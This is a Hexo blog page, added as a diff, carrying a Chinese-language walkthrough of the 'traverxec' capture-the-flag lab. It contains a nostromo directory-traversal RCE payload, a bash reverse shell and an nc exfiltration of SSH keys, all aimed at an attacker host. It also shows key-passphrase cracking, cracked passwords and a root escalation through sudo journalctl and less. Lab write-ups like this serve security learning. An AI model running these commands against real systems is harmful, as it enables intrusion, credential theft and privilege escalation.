@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>traverxec | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scan #### port explore 80:是一个templatemag搭建的网站 #### 目录搜索  nmap扫出来的80端口显示的是nostromo 1.9.6 searchsploit后发现确实存在一个rce漏洞针对nostromo  所以我们可以利用其中的payload &#96;curl -s -X POST &#39;http:&#x2F;&#x2F;10.10.10.165&#x2F;.%0d.&#x2F;.%0d.&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="traverxec">
+<meta property="og:url" content="http://example.com/2022/09/04/traverxec/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scan #### port explore 80:是一个templatemag搭建的网站 #### 目录搜索  nmap扫出来的80端口显示的是nostromo 1.9.6 searchsploit后发现确实存在一个rce漏洞针对nostromo  所以我们可以利用其中的payload &#96;curl -s -X POST &#39;http:&#x2F;&#x2F;10.10.10.165&#x2F;.%0d.&#x2F;.%0d.&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/nmap.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/dir.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/payload.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/wwwshell.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/www.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/pass.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/hash.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/conf.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/pri.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/back.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/sshpass.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/user.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/sudo.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/root1.png">
+<meta property="og:image" content="http://example.com/2022/09/04/traverxec/root2.png">
+<meta property="article:published_time" content="2022-09-04T10:13:14.000Z">
+<meta property="article:modified_time" content="2022-09-05T02:34:17.698Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/09/04/traverxec/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-traverxec" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/09/04/traverxec/" class="article-date">
+  <time class="dt-published" datetime="2022-09-04T10:13:14.000Z" itemprop="datePublished">2022-09-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      traverxec
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/04/traverxec/nmap.png">
+#### port explore
+80:是一个templatemag搭建的网站
+#### 目录搜索
+<img src="/2022/09/04/traverxec/dir.png">
+nmap扫出来的80端口显示的是nostromo 1.9.6
+searchsploit后发现确实存在一个rce漏洞针对nostromo
+<img src="/2022/09/04/traverxec/payload.png">
+所以我们可以利用其中的payload
+`curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d "id | nc 10.10.14.4 8888"`
+<img src="/2022/09/04/traverxec/wwwshell.png">
+在验证了可行性之后，我们将payload改为回弹shell的一个payload
+`curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.4/8888 0>&1"'`
+<img src="/2022/09/04/traverxec/www.png">
+用linenum.sh查看一下系统中是否有需要注意的
+<img src="/2022/09/04/traverxec/pass.png">
+将该密码放入hashcat中跑一下
+<img src="/2022/09/04/traverxec/hash.png">
+密码是Nowonly4me
+在/var/nostromo/conf下，存在一个配置文件
+<img src="/2022/09/04/traverxec/conf.png">
+/homedirs /home指向了nostromo的home目录,在一个用户目录下, the webroot will be public_www。所以http://10.10.10.165/~david will be /home/david/public_www。
+访问/～david目录,但该网站表示无权访问
+<img src="/2022/09/04/traverxec/pri.png">
+尝试访问
+`http://10.10.10.165/~david/.%0d./`
+`http://10.10.10.165/~david/.%0D./.ssh/`
+`http://10.10.10.165/~david/.%0D./user.txt`
+`http://10.10.10.165/~david/index.html`
+均无有用结果
+在/home/david/public_www/protected-file-area中，我们可以发现一个备份文件
+<img src="/2022/09/04/traverxec/back.png">
+用nc将该tar文件传到本机进行分析
+`cat backup-ssh-identity-files.tgz | nc 10.10.14.4 8888`
+`nc -nlvp 8888 > backup-identity-files.tgz.b64`
+解压后存在公钥和私钥
+该公钥是加密过的形式，要用john破解需要先用ssh2john转化格式
+`ssh2john id_rsa > id_rsa.john`
+`john -w=/usr/share/wordlist/rockyou.txt id_rsa.john`
+<img src="/2022/09/04/traverxec/sshpass.png">
+得到连接密码hunter
+用ssh连接david，密码不正确，该密码是phrase for key
+<img src="/2022/09/04/traverxec/user.png">
+
+<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><p>sudo -l用不了，因为没有david的密码<br>在david目录下有一个bin文件夹，进入该文件夹后存在一个server-stats.sh<br>执行该脚本文件<br>查看该脚本文件，可以发现最后一行调用了sudo并且未输入密码，所以david一定在sudo列表里<br><img src="/2022/09/04/traverxec/sudo.png"><br>最后一行用sudo调用了journalctl<br>如果journalctl能能把输出放到当前页，那它就会把输出输出到stdout<br>但是如果输出不下，则会以less形式展示出来，所以需要把控制台缩小到5行以下，让journalstl以less形式输出结果，用less输出的时候我的身份仍是root,然后在less里面调用!&#x2F;bin&#x2F;bash,获得root权限<br><img src="/2022/09/04/traverxec/root1.png"><br><img src="/2022/09/04/traverxec/root2.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/04/traverxec/" data-id="cl7of3c9c0001lhcp7csl90jv" data-title="traverxec" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/09/04/remote/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          remote
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/09/03/tabby/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">tabby</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/09/07/nineveh/">nineveh</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/haircut/">haircut</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/cronos/">cronos</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/bastard/">bastard</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/popcorn/">popcorn</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
